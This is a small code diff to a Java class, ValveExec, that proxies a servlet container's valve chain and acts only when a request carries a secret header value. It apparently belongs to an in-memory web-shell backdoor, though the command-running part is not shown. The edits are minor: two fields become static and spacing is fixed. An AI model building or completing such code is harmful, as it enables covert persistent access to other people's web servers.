@@ -24,8 +24,8 @@ public class ValveExec implements InvocationHandler {
     private Object targetObject;
     private Object next;
 
-    private String lockHeaderKey;
-    private String lockHeaderValue;
+    private static String lockHeaderKey;
+    private static String lockHeaderValue;
 
 
     public ValveExec() {
@@ -42,7 +42,7 @@ public class ValveExec implements InvocationHandler {
             return next;
         } else if (method.getName().equals("setNext")) {
             next = args[0];
-        } else{
+        } else {
             return method.invoke(getFieldValue(targetObject, "basic"), args);
         }
         return null;
@@ -52,7 +52,7 @@ public class ValveExec implements InvocationHandler {
     private void run(Object servletRequest, Object servletResponse) {
         try {
             String lv = (String) invokeMethod(servletRequest, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey});
-            if(lv == null || !lv.contains(lockHeaderValue)) {
+            if (lv == null || !lv.contains(lockHeaderValue)) {
                 return;
             }
 
